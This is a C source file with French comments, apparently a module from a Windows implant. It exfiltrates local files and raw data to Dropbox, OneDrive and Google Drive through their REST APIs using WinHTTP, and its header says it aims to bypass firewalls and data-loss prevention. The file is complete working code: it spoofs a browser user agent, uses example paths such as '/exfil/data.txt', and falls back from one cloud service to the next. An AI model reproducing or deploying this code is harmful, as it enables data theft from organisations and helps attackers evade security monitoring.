/**
 * @file cloud.c
 * @brief Exfiltration Cloud - OneDrive, Dropbox, Google Drive
 * 
 * Upload vers services légitimes pour bypass firewall/DLP
 * Utilise les APIs REST via WinHTTP
 */

#include <windows.h>
#include <winhttp.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "cloud.h"

#pragma comment(lib, "winhttp.lib")

// ============================================================================
// CONFIGURATION
// ============================================================================

#define CLOUD_BUFFER_SIZE   (1024 * 1024)   // 1MB chunks
#define USER_AGENT          L"Mozilla/5.0 (Windows NT 10.0; Win64; x64)"

// Tokens OAuth (à configurer)
static char g_onedrive_token[2048] = "";
static char g_dropbox_token[2048] = "";
static char g_gdrive_token[2048] = "";

// ============================================================================
// CONFIGURATION TOKENS
// ============================================================================

void Cloud_SetOneDriveToken(const char* token) {
    if (token && strlen(token) < sizeof(g_onedrive_token)) {
        strncpy(g_onedrive_token, token, sizeof(g_onedrive_token) - 1);
    }
}

void Cloud_SetDropboxToken(const char* token) {
    if (token && strlen(token) < sizeof(g_dropbox_token)) {
        strncpy(g_dropbox_token, token, sizeof(g_dropbox_token) - 1);
    }
}

void Cloud_SetGDriveToken(const char* token) {
    if (token && strlen(token) < sizeof(g_gdrive_token)) {
        strncpy(g_gdrive_token, token, sizeof(g_gdrive_token) - 1);
    }
}

// ============================================================================
// HTTP HELPER
// ============================================================================

typedef struct _HTTP_RESPONSE {
    DWORD status_code;
    BYTE* body;
    DWORD body_len;
} HTTP_RESPONSE;

/**
 * @brief Effectue une requête HTTP(S)
 */
static BOOL HTTP_Request(
    const wchar_t* host,
    const wchar_t* path,
    const wchar_t* method,
    const wchar_t* headers,
    const BYTE* body,
    DWORD body_len,
    HTTP_RESPONSE* response
) {
    HINTERNET hSession = NULL;
    HINTERNET hConnect = NULL;
    HINTERNET hRequest = NULL;
    BOOL ret = FALSE;
    
    memset(response, 0, sizeof(HTTP_RESPONSE));
    
    // Ouvrir session WinHTTP
    hSession = WinHttpOpen(
        USER_AGENT,
        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
        WINHTTP_NO_PROXY_NAME,
        WINHTTP_NO_PROXY_BYPASS,
        0
    );
    
    if (!hSession) goto cleanup;
    
    // Connexion au serveur
    hConnect = WinHttpConnect(hSession, host, INTERNET_DEFAULT_HTTPS_PORT, 0);
    if (!hConnect) goto cleanup;
    
    // Créer la requête
    hRequest = WinHttpOpenRequest(
        hConnect,
        method,
        path,
        NULL,
        WINHTTP_NO_REFERER,
        WINHTTP_DEFAULT_ACCEPT_TYPES,
        WINHTTP_FLAG_SECURE
    );
    
    if (!hRequest) goto cleanup;
    
    // Ajouter les headers
    if (headers) {
        WinHttpAddRequestHeaders(hRequest, headers, -1, WINHTTP_ADDREQ_FLAG_ADD);
    }
    
    // Envoyer la requête
    BOOL send_result = WinHttpSendRequest(
        hRequest,
        WINHTTP_NO_ADDITIONAL_HEADERS, 0,
        (LPVOID)body, body_len,
        body_len,
        0
    );
    
    if (!send_result) goto cleanup;
    
    // Recevoir la réponse
    if (!WinHttpReceiveResponse(hRequest, NULL)) goto cleanup;
    
    // Lire le status code
    DWORD status_size = sizeof(response->status_code);
    WinHttpQueryHeaders(
        hRequest,
        WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
        WINHTTP_HEADER_NAME_BY_INDEX,
        &response->status_code,
        &status_size,
        WINHTTP_NO_HEADER_INDEX
    );
    
    // Lire le body
    DWORD available = 0;
    DWORD total_read = 0;
    response->body = (BYTE*)malloc(CLOUD_BUFFER_SIZE);
    
    while (WinHttpQueryDataAvailable(hRequest, &available) && available > 0) {
        if (total_read + available > CLOUD_BUFFER_SIZE) break;
        
        DWORD read = 0;
        WinHttpReadData(hRequest, response->body + total_read, available, &read);
        total_read += read;
    }
    
    response->body_len = total_read;
    ret = TRUE;
    
cleanup:
    if (hRequest) WinHttpCloseHandle(hRequest);
    if (hConnect) WinHttpCloseHandle(hConnect);
    if (hSession) WinHttpCloseHandle(hSession);
    
    return ret;
}

static void HTTP_FreeResponse(HTTP_RESPONSE* response) {
    if (response->body) {
        free(response->body);
        response->body = NULL;
    }
}

// ============================================================================
// DROPBOX
// ============================================================================

/**
 * @brief Upload un fichier vers Dropbox
 * @param filepath Chemin local du fichier
 * @param remote_path Chemin distant (ex: "/exfil/data.txt")
 * @return TRUE si succès
 */
BOOL Cloud_Dropbox_Upload(const char* filepath, const char* remote_path) {
    if (!g_dropbox_token[0]) return FALSE;
    
    // Lire le fichier
    HANDLE hFile = CreateFileA(filepath, GENERIC_READ, FILE_SHARE_READ, 
                               NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return FALSE;
    
    DWORD file_size = GetFileSize(hFile, NULL);
    if (file_size == INVALID_FILE_SIZE || file_size > CLOUD_BUFFER_SIZE) {
        CloseHandle(hFile);
        return FALSE;
    }
    
    BYTE* file_data = (BYTE*)malloc(file_size);
    DWORD bytes_read;
    ReadFile(hFile, file_data, file_size, &bytes_read, NULL);
    CloseHandle(hFile);
    
    // Construire les headers
    wchar_t headers[2048];
    wchar_t wtoken[2048];
    wchar_t wpath[512];
    
    MultiByteToWideChar(CP_UTF8, 0, g_dropbox_token, -1, wtoken, 2048);
    MultiByteToWideChar(CP_UTF8, 0, remote_path, -1, wpath, 512);
    
    swprintf(headers, 2048,
        L"Authorization: Bearer %s\r\n"
        L"Dropbox-API-Arg: {\"path\": \"%s\", \"mode\": \"overwrite\"}\r\n"
        L"Content-Type: application/octet-stream",
        wtoken, wpath
    );
    
    // Upload
    HTTP_RESPONSE response;
    BOOL result = HTTP_Request(
        L"content.dropboxapi.com",
        L"/2/files/upload",
        L"POST",
        headers,
        file_data,
        bytes_read,
        &response
    );
    
    free(file_data);
    
    BOOL success = result && (response.status_code == 200);
    HTTP_FreeResponse(&response);
    
    return success;
}

/**
 * @brief Upload des données brutes vers Dropbox
 */
BOOL Cloud_Dropbox_UploadData(const BYTE* data, DWORD data_len, const char* remote_path) {
    if (!g_dropbox_token[0] || !data) return FALSE;
    
    wchar_t headers[2048];
    wchar_t wtoken[2048];
    wchar_t wpath[512];
    
    MultiByteToWideChar(CP_UTF8, 0, g_dropbox_token, -1, wtoken, 2048);
    MultiByteToWideChar(CP_UTF8, 0, remote_path, -1, wpath, 512);
    
    swprintf(headers, 2048,
        L"Authorization: Bearer %s\r\n"
        L"Dropbox-API-Arg: {\"path\": \"%s\", \"mode\": \"overwrite\"}\r\n"
        L"Content-Type: application/octet-stream",
        wtoken, wpath
    );
    
    HTTP_RESPONSE response;
    BOOL result = HTTP_Request(
        L"content.dropboxapi.com",
        L"/2/files/upload",
        L"POST",
        headers,
        data,
        data_len,
        &response
    );
    
    BOOL success = result && (response.status_code == 200);
    HTTP_FreeResponse(&response);
    
    return success;
}

// ============================================================================
// ONEDRIVE
// ============================================================================

/**
 * @brief Upload vers OneDrive (Microsoft Graph API)
 */
BOOL Cloud_OneDrive_Upload(const char* filepath, const char* remote_path) {
    if (!g_onedrive_token[0]) return FALSE;
    
    // Lire le fichier
    HANDLE hFile = CreateFileA(filepath, GENERIC_READ, FILE_SHARE_READ,
                               NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return FALSE;
    
    DWORD file_size = GetFileSize(hFile, NULL);
    if (file_size == INVALID_FILE_SIZE || file_size > CLOUD_BUFFER_SIZE) {
        CloseHandle(hFile);
        return FALSE;
    }
    
    BYTE* file_data = (BYTE*)malloc(file_size);
    DWORD bytes_read;
    ReadFile(hFile, file_data, file_size, &bytes_read, NULL);
    CloseHandle(hFile);
    
    // Construire le path de l'API
    // PUT /me/drive/root:/path/to/file:/content
    wchar_t api_path[1024];
    wchar_t wpath[512];
    MultiByteToWideChar(CP_UTF8, 0, remote_path, -1, wpath, 512);
    swprintf(api_path, 1024, L"/v1.0/me/drive/root:%s:/content", wpath);
    
    // Headers
    wchar_t headers[2048];
    wchar_t wtoken[2048];
    MultiByteToWideChar(CP_UTF8, 0, g_onedrive_token, -1, wtoken, 2048);
    
    swprintf(headers, 2048,
        L"Authorization: Bearer %s\r\n"
        L"Content-Type: application/octet-stream",
        wtoken
    );
    
    HTTP_RESPONSE response;
    BOOL result = HTTP_Request(
        L"graph.microsoft.com",
        api_path,
        L"PUT",
        headers,
        file_data,
        bytes_read,
        &response
    );
    
    free(file_data);
    
    BOOL success = result && (response.status_code == 200 || response.status_code == 201);
    HTTP_FreeResponse(&response);
    
    return success;
}

/**
 * @brief Upload des données brutes vers OneDrive
 */
BOOL Cloud_OneDrive_UploadData(const BYTE* data, DWORD data_len, const char* remote_path) {
    if (!g_onedrive_token[0] || !data) return FALSE;
    
    wchar_t api_path[1024];
    wchar_t wpath[512];
    MultiByteToWideChar(CP_UTF8, 0, remote_path, -1, wpath, 512);
    swprintf(api_path, 1024, L"/v1.0/me/drive/root:%s:/content", wpath);
    
    wchar_t headers[2048];
    wchar_t wtoken[2048];
    MultiByteToWideChar(CP_UTF8, 0, g_onedrive_token, -1, wtoken, 2048);
    
    swprintf(headers, 2048,
        L"Authorization: Bearer %s\r\n"
        L"Content-Type: application/octet-stream",
        wtoken
    );
    
    HTTP_RESPONSE response;
    BOOL result = HTTP_Request(
        L"graph.microsoft.com",
        api_path,
        L"PUT",
        headers,
        data,
        data_len,
        &response
    );
    
    BOOL success = result && (response.status_code == 200 || response.status_code == 201);
    HTTP_FreeResponse(&response);
    
    return success;
}

// ============================================================================
// GOOGLE DRIVE
// ============================================================================

/**
 * @brief Upload vers Google Drive (simple upload)
 */
BOOL Cloud_GDrive_Upload(const char* filepath, const char* filename) {
    if (!g_gdrive_token[0]) return FALSE;
    
    // Lire le fichier
    HANDLE hFile = CreateFileA(filepath, GENERIC_READ, FILE_SHARE_READ,
                               NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return FALSE;
    
    DWORD file_size = GetFileSize(hFile, NULL);
    if (file_size == INVALID_FILE_SIZE || file_size > CLOUD_BUFFER_SIZE) {
        CloseHandle(hFile);
        return FALSE;
    }
    
    BYTE* file_data = (BYTE*)malloc(file_size);
    DWORD bytes_read;
    ReadFile(hFile, file_data, file_size, &bytes_read, NULL);
    CloseHandle(hFile);
    
    // Simple upload API path
    wchar_t api_path[1024];
    wchar_t wfilename[256];
    MultiByteToWideChar(CP_UTF8, 0, filename, -1, wfilename, 256);
    swprintf(api_path, 1024, 
        L"/upload/drive/v3/files?uploadType=media&name=%s", wfilename);
    
    // Headers
    wchar_t headers[2048];
    wchar_t wtoken[2048];
    MultiByteToWideChar(CP_UTF8, 0, g_gdrive_token, -1, wtoken, 2048);
    
    swprintf(headers, 2048,
        L"Authorization: Bearer %s\r\n"
        L"Content-Type: application/octet-stream",
        wtoken
    );
    
    HTTP_RESPONSE response;
    BOOL result = HTTP_Request(
        L"www.googleapis.com",
        api_path,
        L"POST",
        headers,
        file_data,
        bytes_read,
        &response
    );
    
    free(file_data);
    
    BOOL success = result && (response.status_code == 200);
    HTTP_FreeResponse(&response);
    
    return success;
}

/**
 * @brief Upload des données brutes vers Google Drive
 */
BOOL Cloud_GDrive_UploadData(const BYTE* data, DWORD data_len, const char* filename) {
    if (!g_gdrive_token[0] || !data) return FALSE;
    
    wchar_t api_path[1024];
    wchar_t wfilename[256];
    MultiByteToWideChar(CP_UTF8, 0, filename, -1, wfilename, 256);
    swprintf(api_path, 1024,
        L"/upload/drive/v3/files?uploadType=media&name=%s", wfilename);
    
    wchar_t headers[2048];
    wchar_t wtoken[2048];
    MultiByteToWideChar(CP_UTF8, 0, g_gdrive_token, -1, wtoken, 2048);
    
    swprintf(headers, 2048,
        L"Authorization: Bearer %s\r\n"
        L"Content-Type: application/octet-stream",
        wtoken
    );
    
    HTTP_RESPONSE response;
    BOOL result = HTTP_Request(
        L"www.googleapis.com",
        api_path,
        L"POST",
        headers,
        data,
        data_len,
        &response
    );
    
    BOOL success = result && (response.status_code == 200);
    HTTP_FreeResponse(&response);
    
    return success;
}

// ============================================================================
// AUTO-SELECT
// ============================================================================

/**
 * @brief Upload vers le premier service cloud configuré
 */
BOOL Cloud_AutoUpload(const BYTE* data, DWORD data_len, const char* remote_name) {
    // Essayer dans l'ordre: Dropbox -> OneDrive -> GDrive
    
    if (g_dropbox_token[0]) {
        char path[256];
        snprintf(path, sizeof(path), "/%s", remote_name);
        if (Cloud_Dropbox_UploadData(data, data_len, path)) {
            return TRUE;
        }
    }
    
    if (g_onedrive_token[0]) {
        char path[256];
        snprintf(path, sizeof(path), "/%s", remote_name);
        if (Cloud_OneDrive_UploadData(data, data_len, path)) {
            return TRUE;
        }
    }
    
    if (g_gdrive_token[0]) {
        if (Cloud_GDrive_UploadData(data, data_len, remote_name)) {
            return TRUE;
        }
    }
    
    return FALSE;
}

/**
 * @brief Upload un fichier vers le premier service configuré
 */
BOOL Cloud_AutoUploadFile(const char* filepath, const char* remote_name) {
    if (g_dropbox_token[0]) {
        char path[256];
        snprintf(path, sizeof(path), "/%s", remote_name);
        if (Cloud_Dropbox_Upload(filepath, path)) {
            return TRUE;
        }
    }
    
    if (g_onedrive_token[0]) {
        char path[256];
        snprintf(path, sizeof(path), "/%s", remote_name);
        if (Cloud_OneDrive_Upload(filepath, path)) {
            return TRUE;
        }
    }
    
    if (g_gdrive_token[0]) {
        if (Cloud_GDrive_Upload(filepath, remote_name)) {
            return TRUE;
        }
    }
    
    return FALSE;
}

// ============================================================================
// UTILITAIRES
// ============================================================================

/**
 * @brief Vérifie si au moins un service cloud est configuré
 */
BOOL Cloud_IsConfigured(void) {
    return g_dropbox_token[0] || g_onedrive_token[0] || g_gdrive_token[0];
}

/**
 * @brief Liste les services configurés
 */
const char* Cloud_GetConfiguredServices(void) {
    static char services[256];
    services[0] = '\0';
    
    if (g_dropbox_token[0]) strcat(services, "Dropbox ");
    if (g_onedrive_token[0]) strcat(services, "OneDrive ");
    if (g_gdrive_token[0]) strcat(services, "GDrive ");
    
    if (services[0] == '\0') {
        return "None";
    }
    
    return services;
}
